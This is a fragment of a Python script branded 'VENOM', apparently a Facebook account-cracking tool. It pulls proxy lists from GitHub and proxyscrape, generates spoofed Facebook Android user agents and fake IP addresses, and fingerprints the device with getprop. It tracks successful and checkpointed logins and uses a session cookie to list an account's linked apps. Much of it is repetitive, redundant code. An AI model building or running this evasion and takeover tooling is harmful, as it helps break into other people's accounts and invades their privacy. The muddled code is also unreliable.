    ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ugen.append(ua1)
    ugen.append(ua2)
    ugen.append(ua3)
    ugen.append(ua4)
    ugen.append(ua5)
A = '\x1b[1;97m'
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
G='\033[1;92m'
W='\033[1;97m'
mys = '\033[1;97m' 
r =  '\033[1;91m'
idx = []
loop=0
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
twf=[]
os.system('git pull')
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
try:
  proxylist= requests.get('https://github.com/VEN0M03/IG/blob/main/PROXSIY.txt').text
  open('PROXSIY.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('PROXSIY.txt','r').read().splitlines()
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python VENOM.py')
def fetch_proxies_from_github():
    url = "https://raw.githubusercontent.com/VEN0M03/IG/main/PROXSIY.txt"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            with open("PROXSIY.txt", "w") as f:
                f.write(r.text)
            return r.text.splitlines()
    except Exception as e:
        print(f"[!] Download failed to reconnect to the Internet ❌ GitHub: {e}")
    return []
def generate_facebook_ua():
    android_versions = ["7.0", "8.0", "9.0", "10.0", "11.0", "12.0", "13.0", "14.0"]
    densities = [1.0, 1.5, 2.0, 2.5, 3.0, 3.5, 4.0]
    devices = [
        {"model": "Pixel 6 Pro", "brand": "Google", "build": "YCABFMVL"},
        {"model": "SM-G998B", "brand": "Samsung", "build": "UP1A.231005.007"},
        {"model": "CPH2127", "brand": "OPPO", "build": "CPH2127EX_11_A.07"},
        {"model": "SM-G973F", "brand": "Samsung", "build": "G973FXXSBFVA2"},
        {"model": "Mi 11 Lite", "brand": "Xiaomi", "build": "RKQ1.200826.002"},
        {"model": "OnePlus 9 Pro", "brand": "OnePlus", "build": "LE2123_11_F.18"},
    ]
    carriers = ["T-Mobile", "Vodafone", "Boost Mobile", "AT&T", "Verizon", "Orange", "EE", "O2"]
    languages = ["fr_FR", "de_DE", "en_US", "en_GB", "es_ES", "ar_AE", "tr_TR"]
    screen_sizes = [
        {"width": 636, "height": 1899},
        {"width": 973, "height": 1873},
        {"width": 817, "height": 1178},
        {"width": 1080, "height": 2340},
        {"width": 1440, "height": 3040},
        {"width": 720, "height": 1600},
    ]
    device = random.choice(devices)
    android_version = random.choice(android_versions)
    density = random.choice(densities)
    screen = random.choice(screen_sizes)
    carrier = random.choice(carriers)
    language = random.choice(languages)
    fbav_major = random.randint(150, 400)
    fbav_minor = random.randint(0, 99)
    fbav_patch = random.randint(0, 99)
    fbav_build = random.randint(1, 99)
    fbbv = random.randint(1000000, 9999999)
    fbrv = random.randint(1000000, 9999999)
    ua = f"Dalvik/1.8.0 (Linux; U; Android {android_version}; {device['model']} Build/{device['build']}) "
    ua += f"[FBAN/FB4A;FBAV/{fbav_major}.{fbav_minor}.{fbav_patch}.{fbav_build};"
    ua += f"FBBV/{fbbv};"
    ua += f"FBDM/{{density={density},width={screen['width']},height={screen['height']}}};"
    ua += f"FBLC/{language};"
    ua += f"FBRV/{fbrv};"
    ua += f"FBCR/{carrier};"
    ua += f"FBMF/{device['brand']};"
    ua += f"FBBD/{device['brand']};"
    ua += f"FBPN/com.facebook.katana;"
    ua += f"FBDV/{device['model']};"
    ua += f"FBSV/{android_version};"
    ua += f"FBOP/1;"
    ua += f"FBCA/x86:armeabi-v7a]"
    
    return ua
#------------------[ Finished User Agent ]-------------------#
try:
    version = requests.get("https://raw.githubusercontent.com/sijanxd/Server/blob/main/Version.txt").text
except:
    print('No Internet Connection');exit()
version = version.strip()
session = requests.Session()

os.system('pip install httpx')
os.system('pip install requests rich')
os.system('pip install requests')
os.system('pip install mechanize')
os.system('pip install bs4 httpx')
os.system('clear')
def IPV4_FAKEEEE():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))
def parseProxy(proxy_raw):
    p = proxy_raw.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        proxy_url = p
    else:
        proxy_url = "http://" + p
    return {"http": proxy_url, "https": proxy_url}
#------------------[ COLORS ]-------------------#
gggg = '\033[8;102m'#اخضر جديدة تغطية كيمات
rrrr = '\033[8;101m'#احمر جديد تغطية كلمات
rrrrrrrr = '\033[32;101m'#احمر واخضر

# {gas} أخضر
# {green} أخضر
# {red}  احمر
# {white} أبيض
# {faltu}{red} [] 
Red_Dark = "\033[38;5;1m"
Green_Dark = "\033[38;5;2m"
Yellow_Dark = "\033[38;5;3m"
Blue_Dark = "\033[38;5;4m"
Magenta_Dark = "\033[38;5;5m"
Cyan_Dark = "\033[38;5;6m"
White_Dark = "\033[38;5;7m"
Gray_Dark = "\033[38;5;8m"
Red_Light = "\033[38;5;9m"
Green_Light = "\033[38;5;10m"
Yellow_Light = "\033[38;5;11m"
Blue_Light = "\033[38;5;12m"
Magenta_Light = "\033[38;5;13m"
Cyan_Light = "\033[38;5;14m"
White_Light = "\033[38;5;15m"
Black = "\033[38;5;16m"
Navy_Blue = "\033[38;5;17m"
Dark_Blue = "\033[38;5;18m"
Medium_Blue = "\033[38;5;19m"
gggg = '\033[8;102m'#اخضر جديدة تغطية كيمات
rrrr = '\033[8;101m'#احمر جديد تغطية كلمات
rrrrrrrr = '\033[32;101m'#احمر واخضر

# {gas} أخضر
# {green} أخضر
# {red}  احمر
# {white} أبيض
# {faltu}{red} [] 

P = '\x1b[1;97m' # 
M = '\033[1;33m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;96m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' #
R = '\x1b[38;5;246m' #
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N, R]
ssn = requests.Session()
boos = random.choice([P,M,H,K,B,U,O,N,R])
# {boos}
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
P = '\x1b[38;5;1m' # 
M = '\033[38;5;2m' # 
H = '\033[38;5;3m' # 
K = '\x1b[38;5;4m' # 
B = '\x1b[38;5;5m' # 
U = '\x1b[38;5;6m' # 
O = '\x1b[38;5;7m' #
R = '\x1b[38;5;8m' #
N = '\x1b[38;5;9m'    #
my_color = [
 P, M, H, K, B, U, O, N, R]
ssn = requests.Session()
boos = random.choice([P,M,H,K,B,U,O,N,R])
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; VENOM > V3 \x07')
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()

os.system('rm -rf prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]

#------------------[ User agent 3  ]-------------------#
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()   

gtt=random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T'])
    
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])

#------------------[  sim id  ]-------------------#        
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
  
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv}
#ipinfo = requests.get('http://ip-api.com/json/') 

def linex():
    print('\033[1;31m}🗽━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🗽 \x1b[1;91m')
def animation(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;49m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;154m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
style=f"{white}[{red}✪{white}]"
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\033[1;36m';O = '\033[1;35m'
#[ LINEX ]#
def clear():os.system('clear');____banner____()
def linex():print(f'  {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#------------------[  system logo   ]-------------------#        
def Trial(PF):
    global TrialExist
    TrialExist="\n"+"-"*40+"\n     Free \033[1;92mTrial \033[1;97mFor Some Time "
    TrialExist+="\n"+"-"*40+"\n       You Are A "+PF+" User "
    menu()
    
TrialExist=""
logo=(f"""\033[1;31m
               ░█░█░█▀▀░█▀█░█▀█░█▄█
               ░▀▄▀░█▀▀░█░█░█░█░█░█
               ░░▀░░▀▀▀░▀░▀░▀▀▀░▀░▀
\033[90;1m══════════════════════════════════════════════════ \033[91;1mV4
              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \033[1;37mVENOM
              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐆𝐈𝐓𝐇𝗨𝐁    : \033[1;37mVEN0M6
              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐒𝐓𝐀𝐓𝗨𝐒    : \033[1;37mPERMANENT
              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \033[1;37m0.2
              \033[1;31m★\033[1;32m★\033[1;31m★\033[1;32m WELCOME TO THE WORLD OF \033[1;31mVENOM \033[1;32m★\033[1;31m★\033[1;32m★
              \033[1;32m🗼\033[1;31mDONT FORGET TO TAKE YOUR \033[1;32mCATCH SHOTS🗼
\033[90;1m══════════════════════════════════════════════════""")
def linex():
    print('\033[90;1m═══════════════════════════════════════════')
os.system('xdg-open https://www.facebook.com/venom.dz.03')
# I love you Mom 
def dino():
    print('\033[90;1m═════════════════════════════════════════════')

def linex():
    print('\033[90;1m═════════════════════════════════════════════')
#------------------[ system  ]-------------------#

def clear():
    os.system('clear')
    print(logo)

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
    else:
        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
    else:
